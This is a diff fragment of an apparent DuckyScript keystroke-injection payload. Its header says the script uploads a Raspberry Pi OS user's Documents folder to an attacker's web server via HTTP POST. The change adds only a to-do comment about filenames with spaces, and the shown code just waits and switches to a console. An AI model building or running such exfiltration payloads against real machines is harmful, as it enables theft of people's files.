@@ -4,6 +4,8 @@ REM Description: Upload Documents folder to attacker web server
 REM Target: Raspberry Pi OS
 REM Usage: Change attacker IP/URL and port to yours
 REM Usage: Attacker server must be ready to accept files via HTTP POST requests
+
+REM NOTE: Doesn't work on filenames with spaces, need to fix
 REM ===========================================================================
 DELAY 3000
 CTRL-ALT F1
